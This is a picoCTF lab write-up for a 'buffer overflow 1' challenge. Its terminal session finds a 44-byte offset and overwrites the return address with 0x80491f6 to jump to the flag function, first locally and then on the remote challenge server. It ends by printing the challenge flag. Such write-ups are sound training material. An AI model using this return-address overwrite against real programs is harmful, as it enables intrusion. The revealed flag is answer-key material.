# Retos PicoCTF


## Objetivo 
Control the return address Now we're cooking! You can overflow the buffer and return to the flag function in the [program](https://artifacts.picoctf.net/c/186/vuln). You can view source [here](https://artifacts.picoctf.net/c/186/vuln.c). And connect with it using `nc saturn.picoctf.net 53234`
## Solución 

```
                                                                                                
┌──(kali㉿kali)-[~/picoCTF/retos/bufferoverflow1]
└─$ python3 -c "import sys:sys.stdout.buffer.write(b'A'*32)"
  File "<string>", line 1
    import sys:sys.stdout.buffer.write(b'A'*32)
              ^
SyntaxError: invalid syntax
                                                                                                
┌──(kali㉿kali)-[~/picoCTF/retos/bufferoverflow1]
└─$ python3 -c "import sys;sys.stdout.buffer.write(b'A'*32)"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA                                                                                                
┌──(kali㉿kali)-[~/picoCTF/retos/bufferoverflow1]
└─$ python3 -c "import sys;sys.stdout.buffer.write(b'A'*32)" | ./vuln 
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x804932f
                                                                                                
┌──(kali㉿kali)-[~/picoCTF/retos/bufferoverflow1]
└─$ python3 -c "import sys;sys.stdout.buffer.write(b'A'*40)" | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x804932f
zsh: done                python3 -c "import sys;sys.stdout.buffer.write(b'A'*40)" | 
zsh: segmentation fault  ./vuln
                                                                                                
┌──(kali㉿kali)-[~/picoCTF/retos/bufferoverflow1]
└─$ python3 -c "import sys;sys.stdout.buffer.write(b'A'*38)" | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x804932f
                                                                                                
┌──(kali㉿kali)-[~/picoCTF/retos/bufferoverflow1]
└─$ python3 -c "import sys;sys.stdout.buffer.write(b'A'*50)" | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x41414141
zsh: done                python3 -c "import sys;sys.stdout.buffer.write(b'A'*50)" | 
zsh: segmentation fault  ./vuln
                                                                                                
┌──(kali㉿kali)-[~/picoCTF/retos/bufferoverflow1]
└─$ python3 -c "import sys;sys.stdout.buffer.write(b'A'*48)" | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x41414141
zsh: done                python3 -c "import sys;sys.stdout.buffer.write(b'A'*48)" | 
zsh: segmentation fault  ./vuln
                                                                                                
┌──(kali㉿kali)-[~/picoCTF/retos/bufferoverflow1]
└─$ python3 -c "import sys;sys.stdout.buffer.write(b'A'*44)" | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x8049300
zsh: done                python3 -c "import sys;sys.stdout.buffer.write(b'A'*44)" | 
zsh: segmentation fault  ./vuln
                                                                                                
┌──(kali㉿kali)-[~/picoCTF/retos/bufferoverflow1]
└─$ python3 -c "import sys;sys.stdout.buffer.write(b'A'*44+b'\xf6)" | ./vuln
Please enter your string: 
  File "<string>", line 1
    import sys;sys.stdout.buffer.write(b'A'*44+b'\xf6)
                                               ^
SyntaxError: unterminated string literal (detected at line 1)
Okay, time to return... Fingers Crossed... Jumping to 0x804932f
                                                                                                
┌──(kali㉿kali)-[~/picoCTF/retos/bufferoverflow1]
└─$ python3 -c "import sys;sys.stdout.buffer.write(b'A'*44+b'\xf6\x91\x04\0x08')" | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x491f6
zsh: done                python3 -c "import sys;sys.stdout.buffer.write(b'A'*44+b'\xf6\x91\x04\0x08')" | 
zsh: segmentation fault  ./vuln
                                                                                                
┌──(kali㉿kali)-[~/picoCTF/retos/bufferoverflow1]
└─$ python3 -c "import sys;sys.stdout.buffer.write(b'A'*44+b'\xf6\x91\x04\x08')" | ./vuln 
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF(dummie_flag)
zsh: done                python3 -c "import sys;sys.stdout.buffer.write(b'A'*44+b'\xf6\x91\x04\x08')" | 
zsh: segmentation fault  ./vuln
                                                                                                
┌──(kali㉿kali)-[~/picoCTF/retos/bufferoverflow1]
└─$  nc saturn.picoctf.net 63690
Please enter your string: 
0x80491f6
Okay, time to return... Fingers Crossed... Jumping to 0x804932f
                                                                                                
┌──(kali㉿kali)-[~/picoCTF/retos/bufferoverflow1]
└─$ python3 -c "import sys;sys.stdout.buffer.write(b'A'*44+b'\xf6\x91\x04\x08')" | nc saturn.picoctf.net 6369d0
saturn.picoctf.net [13.59.203.175] 6369 (?) : Connection refused
                                                                                                
┌──(kali㉿kali)-[~/picoCTF/retos/bufferoverflow1]
└─$ (python3 -c "import sys;sys.stdout.buffer.write(b'A'*44+b'\xf6\x91\x04\x08')";echo) | nc saturn.picoctf.net 6369d0
saturn.picoctf.net [13.59.203.175] 6369 (?) : Connection refused
                                                                                                
┌──(kali㉿kali)-[~/picoCTF/retos/bufferoverflow1]
└─$ (python3 -c "import sys;sys.stdout.buffer.write(b'A'*44+b'\xf6\x91\x04\x08')";echo) | nc saturn.picoctf.net 63690 
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_5c6baa9e} 
```

## Notas adicionales 

## Referencias 
